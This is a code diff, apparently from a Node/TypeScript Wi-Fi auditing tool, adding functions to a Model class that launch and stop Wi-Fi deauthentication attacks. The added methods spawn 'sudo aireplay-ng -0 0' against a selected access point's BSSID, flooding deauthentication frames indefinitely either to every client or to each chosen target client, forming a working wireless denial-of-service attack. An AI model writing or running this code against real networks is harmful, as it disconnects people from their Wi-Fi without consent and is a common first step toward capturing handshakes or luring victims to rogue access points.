@@ -19,6 +19,7 @@ class Model {
   usedNetworkInterfaceController!: NetworkInterfaceController;
   usedAccessPoint!: AccessPoint;
   scanProcess!: ChildProcess;
+  deauthenticationProcesses!: ChildProcess[];
 
   constructor() {
     this.networkInterfaceControllers = [];
@@ -67,6 +68,37 @@ class Model {
 
   public scanClients = () => {
     this.usedAccessPoint.scanClients(this.usedNetworkInterfaceController.name);
+  }
+
+  private deauthenticateAllClients = async () => {
+    const deauthenticationProcess = spawn('sudo', ['aireplay-ng', '-0', '0', '-a',
+      this.usedAccessPoint.bssid, this.usedNetworkInterfaceController.name]);
+    this.deauthenticationProcesses.push(deauthenticationProcess);
+  }
+
+  private deauthenticateClient = async (target: string) => {
+    const deauthenticationProcess = spawn('sudo', ['aireplay-ng', '-0', '0', '-a',
+      this.usedAccessPoint.bssid, '-c', target, this.usedNetworkInterfaceController.name]);
+    this.deauthenticationProcesses.push(deauthenticationProcess);
+  }
+
+  public deauthenticate = async () => {
+    this.stopDeauthentication();
+    if (this.usedAccessPoint.targets.length === this.usedAccessPoint.clients.length) {
+      this.deauthenticateAllClients();
+      return;
+    }
+    const targets = this.usedAccessPoint.targets;
+    for (let i = 0; i < targets.length; i += 1) {
+      this.deauthenticateClient(targets[i]);
+    }
+  }
+
+  public stopDeauthentication = async () => {
+    for (let i = 0; i < this.deauthenticationProcesses.length; i += 1) {
+      this.deauthenticationProcesses[i].kill('SIGINT');
+    }
+    this.deauthenticationProcesses = [];
   }
 }
 
